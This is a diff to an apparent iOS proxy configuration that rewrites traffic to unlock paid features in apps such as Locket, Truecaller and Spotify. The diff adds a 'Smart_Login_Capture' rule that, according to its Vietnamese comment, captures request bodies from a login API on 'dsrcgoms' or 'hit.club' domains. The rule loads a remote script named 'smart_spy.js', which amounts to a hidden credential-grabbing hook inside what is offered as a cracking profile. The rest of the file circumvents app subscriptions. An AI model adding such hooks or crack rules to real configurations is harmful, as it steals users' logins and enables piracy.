@@ -33,6 +33,9 @@ http-request ^https:\/\/(spclient\.wg\\.spotify\\.com|.*-spclient\\.spotify\\.co
 ^https?:\/\/s\.youtube\.com\/api\/stats\/qoe\?adcontext _ reject-200
 
 [Script]
+# Chỉ chạy Script trên đúng tên miền chứa API đăng nhập (dsrcgoms) và trang chủ
+Smart_Login_Capture = type=http-request,pattern=^https?://.*(dsrcgoms|hit\.club).*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true,timeout=10
+
 # === Locket Gold (Script kích hoạt) ===
 Locket_Gold = type=http-response,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$),requires-body=true,max-size=-1,timeout=60,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/Locket_DuyVinh09.js
 Locket_Delete_Header = type=http-request,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers),script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/deleteHeader.js,timeout=60
@@ -50,3 +53,4 @@ Truecaller = type=http-response,pattern=^https://premium-(.+)\.truecaller\.com/v
 enable = true
 # Danh sách giải mã HTTPS cho các App Premium
 hostname = *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.truecaller.com, *.spotify.com, *.google.com, *.youtube.com
+
